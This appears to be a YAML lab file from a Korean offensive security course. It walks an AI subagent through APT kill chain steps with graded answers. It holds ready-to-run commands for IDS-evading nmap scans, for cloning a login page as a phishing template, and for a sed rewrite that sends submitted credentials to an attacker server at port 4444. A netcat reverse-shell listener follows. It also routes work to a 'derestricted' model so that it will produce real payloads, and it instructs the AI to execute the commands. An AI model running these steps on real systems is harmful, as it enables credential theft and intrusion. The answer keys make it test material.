lab_id: attack-adv-ai-week01
title: APT 킬체인 분석과 공격 시뮬레이션 (AI 지원)
version: ai
course: attack-adv-ai
week: 1
description: 'APT(Advanced Persistent Threat) 킬체인의 7단계를 심층 분석하고, 각 단계별 공격 기법을 실습 환경에서
  시뮬레이션한다. Lockheed Martin 킬체인과 MITRE ATT&CK 프레임워크를 매핑하여 실제 위협 그룹의 TTPs를 재현한다. AI
  SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다. [Model] 공격·대전 과목은 Bastion manager LLM 을 gurubot/gpt-oss-derestricted:120b
  로 자동 라우팅한다 (실제 공격 페이로드 생성 필요). 상세: contents/labs/MODEL_ROUTING.md'
difficulty: hard
duration_minutes: 120
objectives:
- APT 킬체인 7단계(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)를 실습으로 이해한다
- MITRE ATT&CK 매트릭스와 킬체인을 매핑하여 공격 시나리오를 구성한다
- 각 킬체인 단계에서 사용되는 도구와 기법을 직접 적용한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지하라. 타이밍 옵션을
    T2로 설정하여 IDS 회피를 시도하라.
  hint: nmap -sS -T2 옵션을 사용하면 SYN 스캔을 느린 속도로 수행하여 탐지를 회피할 수 있다
  category: recon
  points: 10
  answer: '🤖 프롬프트: nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지해줘

    📎 참고 (CLI): nmap -sS -T2 --max-retries 1 --host-timeout 15s 10.20.30.0/24'
  answer_detail: SYN 스캔(-sS)은 TCP 3-way handshake를 완료하지 않아 연결 로그에 남지 않는 스텔스 기법이다.
    T2(polite) 타이밍은 패킷 전송 간격을 늘려 IDS/IPS의 임계값 기반 탐지를 회피한다. APT 정찰 단계에서 가장 기본적인 기법이다.
  verify:
    type: output_contains
    expect: 10.20.30.
    field: stdout
    semantic:
      intent: APT 정찰 단계의 스텔스 포트 스캔 — SYN(-sS) + 저속 타이밍(-T2)으로 IDS 임계값 탐지 회피하면서 서브넷의
        활성 호스트 탐지
      success_criteria:
      - nmap -sS 또는 동등한 SYN 스캔으로 서브넷(10.20.30.0/24)에 대한 결과 제시
      - T0~T2 의 느린 타이밍 옵션 사용과 이유(IDS 임계값 회피) 설명
      - 활성 호스트 목록(Host is up) 또는 포트 상태(open/filtered) 포함
      acceptable_methods:
      - nmap -sS -T2 <cidr>
      - nmap -sn <cidr> 로 호스트 탐지만 분리 수행
      - masscan --rate 로 저속 SYN 스캔
      - hping3 -S 로 단일 포트 SYN 검증
      negative_signs:
      - SYN 스캔 아닌 Connect(-sT) 스캔만 실행
      - T4/T5 공격적 타이밍 사용 (IDS 회피 논리 깨짐)
      - 네트워크 전체가 아닌 단일 호스트만 스캔
      - 실행 실패 메시지만 출력
  target_vm: attacker
  script: nmap -sS -T2 --max-retries 1 --host-timeout 15s 10.20.30.0/24
  risk_level: low
  bastion_prompt: 'nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 발견된 호스트 {{WEB_IP}}에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행하라. 스크립트
    스캔도 포함하라.
  hint: -sV -O -sC 옵션을 조합하면 상세 정보를 한 번에 수집할 수 있다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행해줘

    📎 참고 (CLI): nmap -sV -O -sC --max-retries 1 --host-timeout 15s -T4 10.20.30.80'
  answer_detail: -sV는 서비스 배너를 분석하여 정확한 버전을 식별하고, -O는 TCP/IP 스택 특성으로 OS를 추정한다. -sC는
    기본 NSE 스크립트를 실행하여 추가 정보(SSL 인증서, HTTP 제목 등)를 수집한다. 이는 킬체인 정찰 단계에서 공격 표면을 정의하는
    핵심 과정이다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: nmap -sV -O -sC 조합으로 대상 호스트의 서비스 버전·OS·기본 NSE 스크립트 결과를 수집하여 공격 표면 정의
      success_criteria:
      - nmap 출력에 포트/서비스/버전 매핑(예 80/tcp open http nginx 1.18.0) 포함
      - OS fingerprinting 추정(Linux 커널 버전, Windows 등) 또는 CPE 정보 제시
      - 기본 NSE 스크립트 결과(SSL 인증서·HTTP 제목·robots.txt 등) 최소 1개 출력
      acceptable_methods:
      - nmap -sV -O -sC <target>
      - nmap --script default,version <target>
      - 배너 그래빙 조합 (nc -vn <target> 80 후 HEAD /)
      - whatweb/wappalyzer 같은 기술 스택 탐지기
      negative_signs:
      - 포트 상태만 나열하고 버전 탐지 없음
      - OS 정보 전혀 없음 (-O 적용되지 않음)
      - 스캔 실패 메시지만 출력되고 버전/OS 정보 없음
  target_vm: attacker
  script: nmap -sV -O -sC --max-retries 1 --host-timeout 15s -T4 10.20.30.80
  risk_level: low
  bastion_prompt: '발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: nmap NSE 스크립트를 활용하여 {{WEB_IP}}의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리
    스크립트를 실행하라.
  hint: --script vuln 옵션으로 취약점 탐지 스크립트를 일괄 실행할 수 있다
  category: recon
  points: 10
  answer: '🤖 프롬프트: nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln
    카테고리 스크립트를 실행해줘

    📎 참고 (CLI): nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4
    10.20.30.80'
  answer_detail: NSE(Nmap Scripting Engine)의 vuln 카테고리에는 CVE 기반 취약점 탐지 스크립트가 포함된다.
    http-vuln-*, ssl-heartbleed 등이 자동 실행되며, 이는 킬체인의 정찰→무기화 전환 단계에서 공격 벡터를 선정하는 데 활용된다.
  verify:
    type: output_contains
    expect: vuln
    field: stdout
    semantic:
      intent: nmap NSE vuln 카테고리로 HTTP 서비스의 알려진 CVE/취약점 자동 탐지 수행
      success_criteria:
      - 'nmap --script vuln 실행 결과 출력 (발견 시 VULNERABLE: 마커, 미발견 시 ERROR 포함 허용)'
      - 최소 1개 스크립트 이름(http-vuln-*, ssl-heartbleed, http-shellshock 등) 언급
      - 스캔 대상 포트/경로 명시
      acceptable_methods:
      - nmap --script vuln -p <ports> <target>
      - nmap --script http-vuln-cve* -p 80,3000 <target>
      - nikto -h <target>:<port> 로 대체 취약점 스캔
      - wapiti/arachni 같은 웹 취약점 스캐너
      negative_signs:
      - vuln 스크립트 아닌 default 스크립트만 실행
      - 스캔 대상 누락 또는 포트 지정 없음
      - 실행 타임아웃만 출력되고 취약점 탐색 언급 없음
  target_vm: attacker
  script: nmap --script vuln -p 80,3000 --max-retries 1 --host-timeout 15s -T4 10.20.30.80
  risk_level: low
  bastion_prompt: 'nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln
    카테고리 스크립트를 실행해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: curl을 사용하여 웹서버({{WEB_IP}}:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를
    다운로드하라. 출력을 /tmp/phish_template.html에 저장하라.
  hint: curl -o 옵션으로 파일로 저장할 수 있다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML
    소스를 다운로드해줘

    📎 참고 (CLI): curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/ && ls
    -la /tmp/phish_template.html && echo "phish_template.html downloaded"'
  answer_detail: APT 무기화 단계에서 스피어 피싱 이메일에 첨부할 피싱 페이지를 제작한다. 대상 조직의 실제 로그인 페이지를 복제하면
    사회공학 공격의 성공률이 높아진다. HTML을 수정하여 자격증명을 공격자 서버로 전송하도록 변조한다.
  verify:
    type: output_contains
    expect: phish_template.html
    field: stdout
    semantic:
      intent: 피싱 무기화를 위한 템플릿 준비 — 대상 로그인 페이지 HTML 을 curl -o 로 저장하고 검증
      success_criteria:
      - curl -o /tmp/phish_template.html (또는 유사 경로) 로 저장
      - 저장된 파일 검증 (ls -la 또는 wc -l) 으로 다운로드 성공 확인
      - APT 무기화 단계와 스피어피싱 목적 맥락 언급
      acceptable_methods:
      - curl -s -o <file> <url>
      - wget -O <file> <url>
      - python requests.get(url).text 후 파일 쓰기
      - httrack/scrapy 로 전체 페이지 복제
      negative_signs:
      - 파일 저장 없이 화면 출력만 (-o 생략)
      - 전혀 다른 URL 저장 (대상 서버 무관)
      - 다운로드 실패만 받고 재시도/대체 시도 없음
  target_vm: attacker
  script: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/ && ls -la /tmp/phish_template.html
    && echo "phish_template.html downloaded"
  risk_level: medium
  bastion_prompt: 'curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML
    소스를 다운로드해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버({{ATTACKER_IP}}:4444)로 변조하라.
    sed를 사용하여 인라인 수정하라.
  hint: sed -i 's/원본/대체/g' 파일명 형태로 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라.
    sed를 사용하여 인라인 수정해줘

    📎 참고 (CLI): sed -i ''s|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g''
    /tmp/phish_template.html 2>/dev/null; grep -o ''action="[^"]*"'' /tmp/phish_template.html
    | head -3 || echo "No form action found - inserting..." && echo ''<form action="http://10.20.30.201:4444/capture">''
    >> /tmp/phish_template.html && grep "10.20.30.201:4444" /tmp/phish_template.html'
  answer_detail: 피싱 페이지의 form action을 변조하면 피해자가 입력한 자격증명이 공격자 서버로 전송된다. 실제 APT 그룹은
    이를 더 정교하게 처리하여 원본 사이트로 리다이렉트하여 피해자가 인지하지 못하게 한다. 이는 킬체인의 전달(Delivery) 단계에 해당한다.
  verify:
    type: output_contains
    expect: 10.20.30.201:4444
    field: stdout
    semantic:
      intent: 피싱 템플릿의 form action URL 을 공격자 서버(<ATTACKER_IP>:4444)로 인라인 변조 — 자격증명
        탈취 경로 구성
      success_criteria:
      - sed -i 또는 동등 in-place 편집으로 action 속성 URL 을 공격자 IP·포트로 교체
      - 변조 후 grep 등으로 새 URL 이 파일에 들어간 것 확인
      - 피싱 자격증명 탈취 흐름 설명 (피해자 폼 제출 시 공격자 서버로 전송)
      acceptable_methods:
      - sed -i s|action=...|action=http://<atk>:4444/capture|g <file>
      - python -c <regex replace script>
      - perl -i -pe s/.../.../g <file>
      - 에디터로 수동 변경 후 저장
      negative_signs:
      - 파일 변경 없이 새 HTML 작성만
      - 공격자 IP:포트 정보 누락
      - 변경 후 검증(grep) 단계 생략
  target_vm: attacker
  script: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
    2>/dev/null; grep -o 'action="[^"]*"' /tmp/phish_template.html | head -3 || echo
    "No form action found - inserting..." && echo '<form action="http://10.20.30.201:4444/capture">'
    >> /tmp/phish_template.html && grep "10.20.30.201:4444" /tmp/phish_template.html
  risk_level: medium
  bastion_prompt: '다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라.
    sed를 사용하여 인라인 수정해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: netcat을 사용하여 {{ATTACKER_IP}}에서 포트 4444로 리스닝 상태를 만들어 리버스 셸 수신 준비를 하라.
    백그라운드로 실행하라.
  hint: nc -lvnp 포트번호로 리스닝 모드를 설정한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: netcat을 사용하여 10.20.30.201에서 포트 4444로 리스닝 상태를 만들어 리버스 셸 수신 준비를해줘

    📎 참고 (CLI): nc -lvnp 4444 &>/tmp/nc_listener.log & sleep 1 && echo "netcat listening
    on port 4444" && ss -tlnp | grep 4444'
  answer_detail: C2(Command & Control) 채널 설정의 기본은 리버스 셸이다. 리스너를 먼저 구성하고 페이로드가 실행되면
    연결이 수립된다. APT 그룹은 단순 netcat 대신 Cobalt Strike, Metasploit Handler 등을 사용하지만, 원리는
    동일하다. 포트 4444는 실습용이며 실제로는 80, 443 등 일반 포트를 사용한다.
  verify:
    type: output_contains
    expect: listening
    field: stdout
    semantic:
      intent: 공격자 VM 에서 netcat 리스너(포트 4444) 를 백그라운드로 띄워 리버스 셸 수신 C2 준비
